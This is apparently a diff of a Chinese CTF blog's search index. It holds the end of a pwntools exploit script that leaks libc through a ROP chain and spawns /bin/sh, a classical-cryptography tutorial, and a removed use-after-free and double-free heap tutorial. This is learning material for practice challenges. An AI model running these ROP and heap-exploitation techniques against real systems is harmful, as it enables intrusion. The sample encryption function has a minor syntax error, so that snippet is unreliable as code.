class="comment">#0</span></span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>##参考链接<br>
+<a href="https://blog.csdn.net/qq_35429581/article/details/78231443">https://blog.csdn.net/qq_35429581/article/details/78231443</a><br>
+<a href="https://www.cnblogs.com/luoleqi/p/12343147.html">https://www.cnblogs.com/luoleqi/p/12343147.html</a><br>
+<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -277,6 +333,137 @@ python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc.bin&quot; &gt; out.b
       <tags>
         <tag>笔记</tag>
         <tag>环境搭建</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>古典密码</title>
+    <url>/2021/10/03/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h1>Crypto入门之古典篇</h1>
+<h2 id="1-古典密码概述"><a class="header-anchor" href="#1-古典密码概述">¶</a>1.古典密码概述</h2>
+<blockquote>
+<ul>
+<li>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用<em><strong>替换式密码</strong></em> 或 <em><strong>移项式密码</strong></em>，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</li>
+</ul>
+</blockquote>
+   <span id="more"></span>
+<p>古典密码通常极容易破解，大部分经典密码都很容易受到唯密文攻击法攻击（cipher text only attack）。而像凯撒这种密钥数有限的密码则容易受到爆破密钥的方式破解，替代式密码有比较大的密钥数，但是容易被频率分析，因为每个密码字母各代表了一个明文字母。多字母替代式密码密码，像是维吉尼亚密码使用多个替换防止了简单的频率分析，然而，更先进的技术卡西斯基试验就可用来破解这类密码。<br>
+所以，在主流的CTF比赛中，一般不会把某种古典密码作为一个题目的核心知识点来考，在比赛中遇到时，一般在搜索引擎中搜索就可以解决。</p>
+<h2 id="2-编码"><a class="header-anchor" href="#2-编码">¶</a>2.编码</h2>
+<h3 id="2-1-base编码"><a class="header-anchor" href="#2-1-base编码">¶</a>2.1 base编码</h3>
+<pre><code>Base64
+    Base64是目前网络上最常见的用于传输8bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。在编码时，3个字节的数据先后（先来的字节占高位）放入一个24位的缓冲区，数据不足3字节时则用0来补足。每次选出6bit按照其值来选择 &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot; 中的字符作为编码输出，若原数据长度len mod 3 = 1 则在编码后加两个&quot;=&quot;,若len mod 3 =2 则加一个&quot;=&quot;,而当刚好为3的倍数时则不会出现等号，如下图。从下图中不难发现当原数据长度不为3的倍数时，在编码时会再末位补0使其成为6的倍数，而在解码时会自动去掉所补的0，如果在编码的时候不全用0位填充而将我们想隐藏的数据放入其中，也并不会影响编码的结果，这就引出了另外一个CTF题型：Base64隐写。
+</code></pre>
+<p><img src="http://static.zybuluo.com/hgggg/088gcrbndggz0d84gpzhfe19/20191230221011783.png" alt="20191230221011783.png-15.6kB"><br>
+<img src="http://static.zybuluo.com/hgggg/mluejayhvknagd7w429ope1h/20191230221143554%20%281%29.png" alt="20191230221143554 (1).png-15.2kB"><br>
+<img src="http://static.zybuluo.com/hgggg/d87dlk5xkqgua437bou3wyt2/20191230221118387.png" alt="20191230221118387.png-14.3kB"></p>
+<pre><code>其它Base编码
+    除了Base64以外，Baes32和Base16也是较为常见的Base编码，它们的编码原理和Basa64一样，后者Base16也是我们常说的Hex编码即16进制，除此之外还有Base58、Baes36、Base91、uuencode、xxencode等也曾出现在CTF的比赛中，它们原理类似，只不过它们使用的码表不同，而在比赛中也常有替换码表的Baes题目。
+</code></pre>
+<h3 id="2-2-其他常见编码"><a class="header-anchor" href="#2-2-其他常见编码">¶</a>2.2 其他常见编码</h3>
+<pre><code>ASCII码：包含大小写字母，数字，常见符号等，是互联网通用语言
+摩斯电码：由点（.）、划（—）组成
+URL编码：又称百分号编码、只是简单的在特殊字符的各个字节前加上%
+jjencode&amp;aaencode:针对JS的编码方式，前者将JS代码转为符号和字符串、后者将之转换为常用网络表情
+一般地，编码只是对原始数据进行一定地处理，使其变得方便传输、储存等操作，并不是为了加密信息，也没有密钥等额外信息，只要知道编码方式就可以还原得到数据内容。
+</code></pre>
+<h2 id="3-单表替换密码"><a class="header-anchor" href="#3-单表替换密码">¶</a>3.单表替换密码</h2>
+<h3 id="3-1单表替换原理"><a class="header-anchor" href="#3-1单表替换原理">¶</a>3.1单表替换原理</h3>
+<pre><code>单表代换是指英文字母在进行密码编码替换的时候，有一张对照表，也就是说，对于每一个字母，都是唯一对应的。
+例如源字母表为：abcdefghijklmnopqrstuvwxyz
+码表为：qwertyuiopasdfghjklzxcvbnm
+</code></pre>
+<p>加密：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#s为码表,m为密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,s</span>)&#123;</span></span><br><span class="line"><span class="function">    <span class="title">c</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">i</span> <span class="title">in</span> <span class="title">range</span> (<span class="params"><span class="number">0</span>,<span class="built_in">len</span>(<span class="params">m</span>)</span>):</span></span><br><span class="line">        k = <span class="built_in">ord</span>(m[i])-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        c += s[k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解密：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,s</span>):</span></span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        t = c[i]</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> t==s[k]:</span><br><span class="line">                m += <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+k)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
+<h3 id="凯撒密码"><a class="header-anchor" href="#凯撒密码">¶</a>凯撒密码</h3>
+<pre><code>凯撒密码是一种最为简单的替换密码，即字母表上的所有的字母向一个方向偏移n位后被替换为密文，如：当n=2时，A就被替换成了C，凯撒及其变种经常会出现在CTF古典密码学的题目中，其加解密公式为：
+</code></pre>
+<p><img src="http://static.zybuluo.com/hgggg/fyyuo0q5dhv857h3n7ga45ap/123456.png" alt="123456.png-10.7kB"></p>
+<pre><code>    由此可以看出，当我们知道一串密文是由凯撒加密得来的时候，即使我们不知到密钥，也可以通过穷举法轻易的破解。
+</code></pre>
+<h3 id="仿射密码（Affine-cipher）"><a class="header-anchor" href="#仿射密码（Affine-cipher）">¶</a>仿射密码（Affine cipher）</h3>
+<pre><code>仿射密码作为一种单表替换密码，码表的每个字母相应的值使用一个简单的数学函数对应一个数值
+其加解密公式如下：
+</code></pre>
+<p>加密：<img src="http://static.zybuluo.com/hgggg/ipwe3sgrjdy67i3wrq742axh/123456%20%282%29.png" alt="123456 (2).png-2.8kB"><br>
+解密：<img src="http://static.zybuluo.com/hgggg/mrl6gjagmgqzmwfwp9r8rc4t/123456%20%283%29.png" alt="123456 (3).png-3.1kB"><br>
+乘法逆元求法：<img src="http://static.zybuluo.com/hgggg/xw1my1dv05jobvaaocdtgzyd/123456%20%284%29.png" alt="123456 (4).png-1.8kB"><br>
+<em><strong>关于公式</strong></em></p>
+<pre><code>a与m互素，m=26,x为原文，b为偏移量
+</code></pre>
+<p><em><strong>关于乘法逆元</strong></em></p>
+<pre><code>    例如，求5关于模14的乘法逆元：14=5*2+4，5=4*1+1说明5与14互素，存在5关于14的乘法逆元。1=5-4=5-(14-5*2)=5*3-14因此，5关于模14的乘法逆元为3。
+</code></pre>
+<p><em><strong>破解</strong></em></p>
+<pre><code>若a=1,则刚好就是凯撒密码。
+若a!=1,我们可以知道m=26，a与m互素，即可得到的取值范围为：1，3，5，7，9，11，13，15，17，19，21，23，25中的一个，所以一共有12*26=312种可能的密钥，此时采用穷举法即可攻击。
+若我们已经知道了两个加密后的字母c1,c2。那么通过公式c1 = a(x1+b) mod m ; c2 = a(x2+b) mod m;则c1-c2可得：c1-c2=a(x1-x2) mod m即可求解a，再用穷举法得到b。
+</code></pre>
+<h2 id="4-多表替换密码"><a class="header-anchor" href="#4-多表替换密码">¶</a>4.多表替换密码</h2>
+<h3 id="4-1多表替换原理"><a class="header-anchor" href="#4-1多表替换原理">¶</a>4.1多表替换原理</h3>
+<pre><code>由于单表替换密码容易被频率分析破解，人们提出了多表替换加密，即用多个码表来依次对明文消息的字母进行代换。相较于单表替换，多表替换后，密文几乎不再保持原来的频率，所以更加难以破解，我们一般只能通过寻找算法实现对应的弱点进行破解。在多表替换中，以Playfair、Vigenere、Nihilist、Hill等较为出名，这里我们指选择分析其中的几种。
+</code></pre>
+<h3 id="4-2autokey-维吉尼亚"><a class="header-anchor" href="#4-2autokey-维吉尼亚">¶</a>4.2autokey/维吉尼亚</h3>
+<pre><code>维吉尼亚密码，作为最经典的多表密码，其码表如下图：
+码表第一排对应明文，第一列对应密钥。例如：
+明文为：i like crypto
+密钥为：nssctf
+密文为：v damx heqhvh
+</code></pre>
+<p>破解<br>
+由于维吉尼亚密码属于多表加密，所以一个字母可能被加密成不同的密文，由于密钥是重复使用的，所以只要知道了密钥的长度，就可以将其看成是交织在一起的凯撒密码，每一个都可以单独破解。密钥长度可以使用卡西斯基试验来得到。</p>
+<p><img src="http://static.zybuluo.com/hgggg/er0k0mqmiaxoeo4ktiw98ioc/1587018-20191126194722022-992570273.jpg" alt="1587018-20191126194722022-992570273.jpg-207.2kB"></p>
+<pre><code>Autokey与维吉尼亚密码密码类似，自动密钥密码（Autokey）主要有两种，关键词自动密钥密码和原文自动密钥密码。所以它比维吉尼亚更加安全。下面我们以关键词自动密钥为例：
+明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG
+关键词：CULTURE
+自动生成密钥：CULTURE THE QUICK BROWN FOX JUMPS OVER THE
+密文：VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK
+</code></pre>
+<h3 id="4-3希尔密码"><a class="header-anchor" href="#4-3希尔密码">¶</a>4.3希尔密码</h3>
+<pre><code>希尔密码（Hill）使用每个字母在字母表中的顺序作为其对应的数字，即A=0，B=1，C=2 等，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。加密矩阵必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。
+</code></pre>
+<p>加密：<br>
+<img src="http://static.zybuluo.com/hgggg/geep66492gw4cd9jwo6yamm1/123456%20%285%29.png" alt="123456 (5).png-68.1kB"><br>
+解密：<br>
+求出加密矩阵的逆矩阵然后同密文相乘后再对等到的矩阵模26(人懒就不上图了)</p>
+<h2 id="5-其他密码"><a class="header-anchor" href="#5-其他密码">¶</a>5.其他密码</h2>
+<h4 id="培根密码："><a class="header-anchor" href="#培根密码：">¶</a>培根密码：</h4>
+<p><img src="http://static.zybuluo.com/hgggg/7alys7nj2040f01lc4mmbzj7/123456.png" alt="123456.png-19.2kB"></p>
+<h4 id="栅栏密码："><a class="header-anchor" href="#栅栏密码：">¶</a>栅栏密码：</h4>
+<pre><code>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。
+</code></pre>
+<h4 id="JSFuck"><a class="header-anchor" href="#JSFuck">¶</a>JSFuck:</h4>
+<p>形如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br><span class="line">原作者github:https://github.com/aemkei/jsfuck</span><br></pre></td></tr></table></figure>
+<h4 id="BrainFuck"><a class="header-anchor" href="#BrainFuck">¶</a>BrainFuck</h4>
+<pre><code>一种极小众的计算机语言，由“&gt;、&lt;、+、-、.、,、[、]&quot;八个符号组成。该语言由目前有专门的解释器，感兴趣可以自行了解。
+</code></pre>
+<h4 id="猪圈及其变形"><a class="header-anchor" href="#猪圈及其变形">¶</a>猪圈及其变形</h4>
+<pre><code>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。
+</code></pre>
+<p><img src="http://static.zybuluo.com/hgggg/j5ds8cf7kr3ivkob7dbyhniv/123456.jpg" alt="123456.jpg-26.6kB"></p>
+<h4 id="跳舞的小人"><a class="header-anchor" href="#跳舞的小人">¶</a>跳舞的小人</h4>
+<pre><code>出自《福尔摩斯》的密码
+</code></pre>
+<p><img src="http://static.zybuluo.com/hgggg/g6nj57kk1444l2zizplrhla0/123456%20%282%29.jpg" alt="123456 (2).jpg-23.3kB"></p>
+<h4 id="来自宇宙的信号"><a class="header-anchor" href="#来自宇宙的信号">¶</a>来自宇宙的信号</h4>
+<p><img src="http://static.zybuluo.com/hgggg/9rbnfvwqapog0zs4at0bqzuw/20180310123813709.png" alt="20180310123813709.png-92.4kB"></p>
+<h4 id="古精灵码"><a class="header-anchor" href="#古精灵码">¶</a>古精灵码</h4>
+<p><img src="http://static.zybuluo.com/hgggg/zrn18wxlgf7gi88475gs61ni/55409313b07eca805f84325b982397dda044835e.jpg" alt="55409313b07eca805f84325b982397dda044835e.jpg-29.3kB"></p>
+<pre><code>除了以上列出来的这些，还有盲文、数字盲文、音符加密、01248、与佛论禅等也曾出现在CTF比赛中。
+</code></pre>
+<h3 id="6-常用网站"><a class="header-anchor" href="#6-常用网站">¶</a>6.常用网站</h3>
+<pre><code>http://ctf.ssleye.com/#
+https://quipqiup.com/
+</code></pre>
+]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>古典密码</tag>
       </tags>
   </entry>
   <entry>
@@ -495,192 +682,6 @@ bypass思路：__overflow-&gt;_IO_strn_jump-&gt;_IO_str_finish(_IO_FILE+0x38 = /
 <a href="https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd">https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd</a><br>
 <a href="https://www.cnblogs.com/hetianlab/p/13884739.html">https://www.cnblogs.com/hetianlab/p/13884739.html</a><br>
 <a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p>
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>UAF</title>
-    <url>/2021/10/04/UAF/</url>
-    <content><![CDATA[<h1>Use after free</h1>
-<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
-<pre><code>就是某块内存释放后，任能被用户使用，即存在野指针（一般是free后没有将指针置NULL）
-</code></pre>
-<span id="more"></span>
-<h3 id="样例"><a class="header-anchor" href="#样例">¶</a>样例</h3>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="malloc内存对齐"><a class="header-anchor" href="#malloc内存对齐">¶</a>malloc内存对齐</h3>
-<p>在大多数情况下，编译器和C库透明地帮你处理对齐问题。POSIX 标明了通过malloc( ), calloc( ), 和 realloc( ) 返回的地址对于任何的C类型来说都是对齐的。这样可以避免内存中的碎片，提高程序效率。</p>
-<p>来看下malloc.h的部分源码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>翻译翻译就是malloc在对其的时侯，其对其参数必须是2的幂且在32为下8byte,64位下为16byte</p>
-<p>但是最小分配单位并不是对齐单位，最小分配单位MINSIZE：</p>
-<p>计算MINSIZE=（16+8-1） &amp; ~（8-1）=16字节</p>
-<p>即32位下malloc的最小分配单位为16字节，64位下最小分配单位为32字节。</p>
-<p>其中request2size就是malloc的内存对齐操作。</p>
-<p>从request2size还可以知道，如果是64位系统，申请内存为1~24字节时，系统内存消耗32字节，当申请内存为25字节时，系统内存消耗48字节。 如果是32位系统，申请内存为1~12字节时，系统内存消耗16字节，当申请内存为13字节时，系统内存消耗24字节。（类似计算MINSIZE）</p>
-<h3 id="UAF-的利用"><a class="header-anchor" href="#UAF-的利用">¶</a>UAF 的利用</h3>
-<p>当申请两个fastbin范围内的堆块后，fastbin如下图所示</p>
-<p><img src="http://static.zybuluo.com/hgggg/i7inxma7n1gx14yc77t3f824/31.png" alt="31.png-16.6kB"></p>
-<p>此时可以利用UAF修改chunk0的指针，当我们再次申请出这两个堆的时候，就可以申请到想要修改的地址处,进行后续的一些修改</p>
-<h3 id="double-free"><a class="header-anchor" href="#double-free">¶</a>double free</h3>
-<p>double free 和 UAF 一样同样也是由于指针为清空造成的漏洞，与UAF的漏洞利用方式差不多，常被用于与fastbin attack 组合利用</p>
-<p>下面介绍一种利用double free 来达到任意地址写的利用方式</p>
-<p>当申请两个堆块并且释放时fastbin中有如下结构：</p>
-<pre><code>fastbin[Y] -&gt; chunk1 -&gt; chunk0
-</code></pre>
-<p>而此时我们再次释放chunk1</p>
-<pre><code>fastbin[Y] -&gt; chunk0 -&gt;  &lt;- chunk1 
-</code></pre>
-<p>如果我们此时申请一个新的chunk</p>
-<p><img src="http://static.zybuluo.com/hgggg/71qyoakamj0w6w0xbywxwzmp/32.png" alt="32.png-14.2kB"></p>
-<p>此时修改new chunk的指针</p>
-<p><img src="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png" alt="33.png-19.6kB"></p>
-<p>再申请一个chunk1</p>
-<p><img src="http://static.zybuluo.com/hgggg/vevy3cstvblcgtha3rphjc9n/34.png" alt="34.png-17.1kB"></p>
-<p>在申请一个chunk后这个chunk就会合chunk1重合，且fastbin链表已经指向了我们想要修改的地址了，只要再申请一个堆块就会申请到想要修改的地址，然后只要编辑这个堆块便可完成任意地址写。</p>
-<p><img src="http://static.zybuluo.com/hgggg/wj1tdtf92h6wmo5khhpfl6st/35.png" alt="35.png-21.6kB"></p>
-<h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2>
-<h3 id="hacknote"><a class="header-anchor" href="#hacknote">¶</a>hacknote</h3>
-<h4 id="IDA-分析"><a class="header-anchor" href="#IDA-分析">¶</a>IDA 分析</h4>
-<p>add<br>
-<img src="http://static.zybuluo.com/hgggg/6ptrl1aq1a1u68hla9ixm5pg/25.png" alt="25.png-60.2kB"></p>
-<p>delete<br>
-<img src="http://static.zybuluo.com/hgggg/2oqox20pffmb7diztd5htwkl/26.png" alt="26.png-44.3kB"></p>
-<h4 id="利用思路"><a class="header-anchor" href="#利用思路">¶</a>利用思路</h4>
-<p><img src="http://static.zybuluo.com/hgggg/2n71il94qre8z0swlok1n29f/27.png" alt="27.png-77.8kB"></p>
-<p>由上图可以看到，当我们申请一个note的时候，此时堆块的结构如下图所示</p>
-<p><img src="http://static.zybuluo.com/hgggg/z1bunz0mfb0mxrboc7tgftsy/28.png" alt="28.png-23.5kB"></p>
